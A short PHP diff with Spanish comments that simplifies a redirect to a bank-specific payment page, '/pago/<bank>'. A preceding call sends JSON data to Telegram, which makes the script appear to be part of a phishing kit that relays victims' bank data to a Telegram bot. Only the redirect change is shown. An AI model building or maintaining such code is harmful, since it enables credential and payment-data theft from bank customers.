@@ -42,7 +42,7 @@ enviarMensajeTelegram($jsonData);
 $bank = strtolower(preg_replace('/[^A-Za-z0-9_-]/', '', $banco));
 
 // POST-Redirect-GET (303) a la URL bonita: /pago/<banco>
-header('Location: /pago/' . rawurlencode($bank) . '/' . rawurlencode($bank) . '.php', true, 303);
+header('Location: /pago/' . rawurlencode($bank), true, 303);
 exit;
 ?>
 
